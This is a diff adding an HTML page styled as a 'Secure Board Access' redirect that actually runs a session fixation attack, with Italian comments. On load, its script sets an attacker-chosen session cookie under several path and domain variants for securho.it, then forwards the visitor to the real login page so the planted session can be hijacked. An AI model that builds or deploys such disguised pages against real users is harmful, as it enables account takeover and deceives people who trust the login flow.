@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Board Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 10px;
+            display: inline-block;
+            backdrop-filter: blur(10px);
+        }
+        .loading {
+            margin: 20px 0;
+        }
+        .dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: white;
+            margin: 0 5px;
+            animation: bounce 1.5s infinite;
+        }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 Secure Board Access</h1>
+        <p>Redirecting to login page...</p>
+        <div class="loading">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+        <p><small>Please wait while we secure your session</small></p>
+    </div>
+
+    <script>
+        // IL TUO COOKIE MALEVOLO - SOSTITUISCI QUESTO!
+        const maliciousCookie = "bj34pekpkm8l1gbf2dufl3pl3a";
+        
+        // URL della vera login page
+        const targetLoginPage = "https://board.securho.it/index.php";
+        
+        console.log("🎣 Iniziando Session Fixation Attack...");
+        
+        // Prova diversi modi per impostare il cookie
+        function setCookie() {
+            console.log("🔧 Impostando cookie malevolo...");
+            
+            // Metodo 1: Path e domain completi
+            document.cookie = `session=${maliciousCookie}; path=/; domain=.securho.it`;
+            console.log("✅ Tentativo 1: path=/, domain=.securho.it");
+            
+            // Metodo 2: Solo path
+            document.cookie = `session=${maliciousCookie}; path=/`;
+            console.log("✅ Tentativo 2: path=/");
+            
+            // Metodo 3: Senza path (default)
+            document.cookie = `session=${maliciousCookie}`;
+            console.log("✅ Tentativo 3: senza path");
+            
+            // Metodo 4: Path specifico per index.php
+            document.cookie = `session=${maliciousCookie}; path=/index.php`;
+            console.log("✅ Tentativo 4: path=/index.php");
+        }
+        
+        // Esegui l'attacco dopo il caricamento della pagina
+        window.onload = function() {
+            console.log("🚀 Pagina caricata, iniziando attacco...");
+            
+            setCookie();
+            
+            // Aspetta 2 secondi per far impostare i cookie
+            setTimeout(function() {
+                console.log("🔍 Verificando cookie impostati...");
+                console.log("Cookie attuali:", document.cookie);
+                
+                // Reindirizza alla vera login page
+                console.log("🔄 Reindirizzando a:", targetLoginPage);
+                window.location.href = targetLoginPage;
+                
+            }, 2000);
+        };
+        
+        // Backup: reindirizza dopo 5 secondi comunque
+        setTimeout(function() {
+            window.location.href = targetLoginPage;
+        }, 5000);
+    </script>
+</body>
+</html>
